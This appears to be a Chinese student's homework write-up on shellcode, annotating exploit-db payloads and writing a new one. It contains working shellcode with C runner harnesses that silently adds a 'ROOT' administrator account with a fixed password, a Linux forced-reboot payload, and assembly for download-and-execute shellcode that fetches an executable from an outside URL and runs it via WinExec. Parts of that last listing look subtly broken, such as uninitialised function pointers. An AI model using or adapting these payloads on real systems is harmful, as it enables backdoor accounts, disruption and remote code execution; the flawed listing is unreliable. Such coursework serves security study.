# 作业

> 1、详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。

```c++
//windows系统将密码为“I@mR00T$”的用户“ROOT”添加到系统的Windows shell代码。将用户“ROOT”添加到本地组“Administrators”中
get_kernel32_address://找到kernel32.dll的基地址
xor eax, eax
mov eax, [fs:eax+0x30] ; EAX = &PEB
//PEB数据结构，在每个进程中，是一个固定的位置，是一个绝对的常量地址eax+0x30
mov eax, [eax+0xC]     ; EAX = &LDR
mov esi, [eax+0x1C]    ; ESI = 1st entry InitOrderList - ntdll.dll
lodsd                  ; EAX = 2nd entry InitOrderList - kernelbase.dll
xchg esi, eax
lodsd                  ; EAX = 3rd entry InitOrderList - kernel32.dll
mov eax, [eax+0x8]     ; EAX = &Kernel32.dll
push eax
//查找kernel32.dll导出表的地址
get_kernel32_export_table:
mov ebx, [eax+0x3C] ; EBX = RVA NewEXEHeader
add ebx, eax        ; EBX = &NewEXEHeader
mov ebx, [ebx+0x78] ; EBX = RVA ExportTable
add ebx, eax        ; EBX = &ExportTable
//查找名称指针表的地址
get_export_name_table:
mov edx, [ebx+0x20] ; EDX = RVA ExportNameTable
add edx, eax        ; EDX = &ExportNameTable
//查找序号表的地址
get_export_ordinal_table:
mov ecx, [ebx+0x24] ; ECX = RVA ExportOrdinalTable
add ecx, eax        ; ECX = &ExportOrdinalTable
push ecx
//查找地址表的地址
get_export_addr_table:
mov edi, [ebx+0x1C] ; EDI = RVA ExportAddrTable
add edi, eax        ; EDI = &ExportAddrTable
push edi
//WinE的bigending反写
WinExec_String:
push 0x456E6957 ; EniW
//初始化计数器以防止无限循环
counter_init:
xor eax, eax    ; EAX = Counter
//循环在ExportNameTable中查找，并将我们的字符串与kernel32.dll的名称字符串进行比较
searchLoop:
mov edi, edx    ; EDI = &ExportNameTable
mov esi, esp    ; ESI = "WinE"
xor ecx, ecx
cld                  ; Process strings left to right
mov edi, [edi+eax*4] ; EDI = RVA NthNameString
add edi, [esp+0xC]   ; EDI = &NthNameString
add cx, 0x4          ; ECX = len("WinE")
repe cmpsb           ; compare [&NthNameString] to "WinExec"
jz found             ; If [&NthNameString] == "WinExec" end loop
inc eax              ; Counter ++
jmp short searchLoop ; restart loop
//使用计数器的最后一个值查找WinExec的地址
found:
mov ecx, [esp+0x8]     ; ECX = &ExportOrdinalTable
mov ax,  [ecx + eax*2] ;  AX = ordinalNumber
mov edx, [esp+0x4]     ; EDX = &ExportAddrTable
mov ebx, [edx + eax*4] ; EBX = RVA WinExec
add ebx, [esp+0xC]     ; EBX = &WinExec
//添加用户的cmd命令
add_user:
; Call WinExec( CmdLine, ShowState );
; $CmdLine = 'cmd.exe /c net user ROOT I@mR00T$ /ADD && net localgroup Administrators ROOT /ADD'
; $ShowState = SW_HIDE  
xor ecx, ecx
mul ecx
mov al, 0x44    ; D : 44
push eax
push 0x44412f20 ; DA/  
push 0x544f4f52 ; TOOR 
push 0x2073726f ;  sro 
push 0x74617274 ; tart 
push 0x73696e69 ; sini 
push 0x6d644120 ; mdA  
push 0x70756f72 ; puor 
push 0x676c6163 ; glac 
push 0x6f6c2074 ; ol t 
push 0x656e2026 ; en & 
push 0x26204444 ; & DD 
push 0x412f2024 ; A/ $ 
push 0x54303052 ; T00R 
push 0x6d404920 ; m@I  
push 0x544f4f52 ; TOOR 
push 0x20726573 ;  res 
push 0x75207465 ; u te 
push 0x6e20632f ; n c/ 
push 0x20657865 ;  exe 
push 0x2e646d63 ; .dmc 
mov eax, esp    ; EAX = &CmdLine
push ecx        ; $ShowState 
push eax        ; $CmdLine
call ebx        ; Call the WinExec Function
/////////////////////////////////////////////////////////////////////////////////
#include <windows.h>
#include <stdio.h>

char code[] = \
"\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x1c"
"\xad\x96\xad\x8b\x40\x08\x50\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x53\x20\x01\xc2\x8b\x4b"
"\x24\x01\xc1\x51\x8b\x7b\x1c\x01\xc7\x57\x68\x57"
"\x69\x6e\x45\x31\xc0\x89\xd7\x89\xe6\x31\xc9\xfc"
"\x8b\x3c\x87\x03\x7c\x24\x0c\x66\x83\xc1\x04\xf3"
"\xa6\x74\x03\x40\xeb\xe7\x8b\x4c\x24\x08\x66\x8b"
"\x04\x41\x8b\x54\x24\x04\x8b\x1c\x82\x03\x5c\x24"
"\x0c\x31\xc9\xf7\xe1\xb0\x44\x50\x68\x20\x2f\x41"
"\x44\x68\x52\x4f\x4f\x54\x68\x6f\x72\x73\x20\x68"
"\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41"
"\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67"
"\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
"\x44\x20\x26\x68\x24\x20\x2f\x41\x68\x52\x30\x30"
"\x54\x68\x20\x49\x40\x6d\x68\x52\x4f\x4f\x54\x68"
"\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63"
"\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e"
"\x89\xe0\x51\x50\xff\xd3";

int main(int argc, char **argv)
{
    int (*func)();
    DWORD dwOldProtect;
    func = (int(*)()) code;
    VirtualProtect(func, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    func = (int(*)())code;
    (int)(*func)();
}
```

```c++
//windows弹窗MessageBoxA()
#include <stdio.h>

char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\x51\x68\x6c\x6c\x20\x20\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72"
"\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" // 0x7c801d7b ; LoadLibraryA(user32.dll)
"\xff\xd3\xb9\x5e\x67\x30\xef\x81"
"\xc1\x11\x11\x11\x11\x51\x68\x61"
"\x67\x65\x42\x68\x4d\x65\x73\x73"
"\x89\xe1\x51\x50\xbb\x40\xae\x80" // 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
"\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
"\x51\x51\x52\xff\xd0\x31\xc0\x50"
"\xb8\x12\xcb\x81\x7c\xff\xd0";    // 0x7c81cb12 ; ExitProcess(0)

int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) shellcode;
   printf("Shellcode Length is : %d",strlen(shellcode));
   (int)(*func)();
   
}
```

```c++
//linux系统强制重新启动
global _start			

section .text
_start:
	//初始化EAX,EBX,ECX,EDX寄存器
	xor eax, eax                ; Clearing the EAX register
    xor ebx, ebx                ; Clearing the EBX register
    xor ecx, ecx                ; Clearing the ECX register
    cdq                         ; Clearing the EDX register
	//在al中加载系统调用值0x58，要想成功调用reboot API，第一个参数必须是0xfee1dead，第二个参数能且只能是0x28121969
    mov al, 0x58                ; Loading syscall value = 0x58 for reboot in AL
    //加载重启代码
    mov ebx, 0xfee1dead         ; Loading magic 1 in EBX
    mov ecx, 672274793          ; Loading magic 2 in ECX
    mov edx, 0x1234567          ; Loading cmd val = LINUX_REBOOT_CMD_RESTART in EDX
    //触发系统调用运行重启代码
    int 0x80                    ; Executing the reboot syscall
 //////////////////////////////////////////////////////
#include <stdio.h>
#include <string.h>
unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x58\xbb\xad\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xcd\x80";

void main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

> 2、修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA

```c++
_start:
; Create a new stack frame
 mov ebp, esp            ; Set base stack pointer for new stack-frame
 sub esp, 0x20           ; Decrement the stack by 32 bytes

; 找到 kernel32.dll 基地址
 xor ebx, ebx            ; EBX = 0x00000000
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll

; Find the address of the WinExec Symbol within kernel32.dll
; + The hex values will change with different versions of Windows

; 找到 kernel32.dll导出表的地址
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
 add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
 add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll
     
;可以通过kernel32.dll中的LoadLibraryA函数来加载UrlDownlaodToFileA
xor edx, edx            ; EDX = 0x00000000
push edx                ; null terminator
push 0x41797261         ; Ayra 
push 0x7262694c         ; rbiL 
push 0x64616f4c         ; daoL
push esp                ; $hModule    -- push the address of the start of the string onto the stack
push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
call eax                ; Call the GetProcAddress Function.
mov [ebp-0x20], eax     ; save Address of LoadLibraryA
xor eax, eax            ; clear eax
mov ax, 0x6E6F          ; no 
push eax
push 0x6D6C7275         ; mlru
push esp                ; push the pointer to the string
mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
call ebx                ; call the LoadLibraryA Function to load urlmon.dll
mov [ebp-0x24], eax     ; save Address of urlmon.dll
xor edx, edx
mov dx, 0x4165          ; Ae
push edx
push 0x6C69466F         ; liFo
push 0x5464616F         ; Tdao
push 0x6C6E776F         ; lnwo
push 0x444c5255         ; DLRU
push esp    		    ; push pointer to string to stack for 'URLDownloadToFileA'
push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
call eax                ; GetProcAddress
mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA
;调用UrlDownlaodToFileA
download:
pop eax
xor ecx, ecx
push ecx
; URL: https://media.st.dl.eccdnx.com/client/installer/SteamSetup.exe
;逆序:exe.puteSmaetS/rellatsni/tneilc/moc.xndcce.ld.ts.aidem//:sptth
mov ax, 0x6578          ; ex转为十六位十六进制 : 6578
push 0x652e7075         ; e.pu
push 0x7465536d         ; teSm
push 0x61657453         ; aetS
push 0x2f72656c         ; /rel
push 0x6c617473         ; lats
push 0x6e692f74         ; ni/t
push 0x6e65696c         ; neil
push 0x632f6d6f         ; c/mo
push 0x632e786e         ; c.xn
push 0x64636365         ; dcce
push 0x2e6c642e         ; .ld.
push 0x74732e61         ; ts.a
push 0x6964656d         ; idem
push 0x2f2f3a73         ; //:s
push 0x70747468         ; ptth
push esp
pop ecx                 ; save the URL string
xor ebx, ebx
push ebx
; save as code.exe
push 0x6578652E         ; exe.
push 0x65646f63         ; edoc
push esp
pop ebx                 ; save the downloaded filename string
xor edx, edx
push edx
push edx
push ebx
push ecx
push edx
mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
call eax
pop ecx
add esp, 44
xor edx, edx
cmp eax, edx
push ecx
;使用WinExec函数运行该程序
mov edx, 0x63657878     ; "cexx"
shr edx, 8              ; Shifts edx register to the right 8 bits
push edx                ; "\x00,cex"
push 0x456E6957         ; EniW 
mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
call findFunctionAddr   ; After Return EAX will = &WinExec
xor ecx, ecx            ; clear eax register
push ecx                ; string terminator 0x00 for "code.exe" string
push 0x6578652e         ; exe.
push 0x6B636168         ; edoc
mov ebx, esp            ; save pointer to "code.exe" string in eax
inc ecx                 ; 
push ecx                ; 
push ebx                ; 
call eax                ; Call the WinExec Function
```

